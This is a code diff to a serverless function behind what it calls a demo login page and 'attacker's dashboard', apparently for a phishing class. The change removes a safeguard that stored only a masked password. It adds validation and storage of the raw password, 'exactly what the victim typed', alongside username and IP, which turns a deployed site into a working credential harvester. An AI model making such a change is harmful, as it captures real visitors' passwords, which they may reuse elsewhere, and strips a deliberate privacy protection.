@@ -2,9 +2,9 @@
 //
 // Receives a submission from the static demo login page and stores it in the
 // class Supabase project so the instructor has a live "attacker's dashboard"
-// on the deployed site. SECURITY: the real password never leaves the visitor's
-// browser — login.js only ever sends password_masked = "********", so no usable
-// credential is ever stored or transmitted by this backend.
+// on the deployed site. The instructor opted into storing the real password
+// (see login.js) for the full demo experience; the /password dashboard that
+// reads these rows is protected by HTTP Basic Auth (DEMO_INSTRUCTOR_PASS).
 //
 // Env vars (set in Netlify): SUPABASE_URL, SUPABASE_ANON_KEY
 exports.handler = async (event) => {
@@ -37,14 +37,26 @@ exports.handler = async (event) => {
     return { statusCode: 400, body: "invalid username" };
   }
 
+  // Real password (instructor opted in). Mirrors the Flask checks exactly:
+  // 8-64 chars, no control characters. Passwords are NOT trimmed — leading /
+  // trailing spaces are significant. Validate the RAW value and reject
+  // oversized input (never truncate — a stored password must be exactly what
+  // the victim typed).
+  const password = typeof body.password === "string" ? body.password : "";
+  if (
+    password.length < 8 ||
+    password.length > 64 ||
+    [...password].some((c) => c.charCodeAt(0) < 32)
+  ) {
+    return { statusCode: 400, body: "invalid password" };
+  }
+
   const ip = (event.headers["x-nf-client-connection-ip"] || "unknown").slice(0, 45);
 
-  // The backend NEVER stores a password field from the client — the mask is
-  // hardcoded, so even a caller that posts a real value in any password field
-  // can only ever persist "********".
   const payload = {
     username,
-    password_masked: "********",
+    password_masked: "********", // legacy column (kept NOT NULL in the schema)
+    password,
     created_at:
       typeof body.time === "string" ? body.time.slice(0, 64) : new Date().toLocaleString(),
     ip,
